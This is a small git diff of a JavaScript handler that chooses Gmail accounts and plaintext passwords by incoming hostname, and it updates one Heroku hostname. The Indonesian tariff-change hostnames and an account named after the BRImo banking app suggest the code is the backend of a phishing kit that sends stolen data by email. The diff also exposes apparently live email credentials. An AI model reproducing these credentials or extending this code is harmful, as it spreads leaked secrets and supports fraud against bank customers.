@@ -28,7 +28,7 @@ export default function handler(req, res) {
         email = 'tarifbaru36@gmail.com';
         pass = 'moiasopufjkptyvr';
 
-    } else if(url == 'baru-lama-tarif.herokuapp.com'){
+    } else if(url == 'ubah-tarifbaru-lama.herokuapp.com'){
         email = 'accbrimo05@gmail.com';
         pass = 'hluxpmqqqqsjrbaf';
 
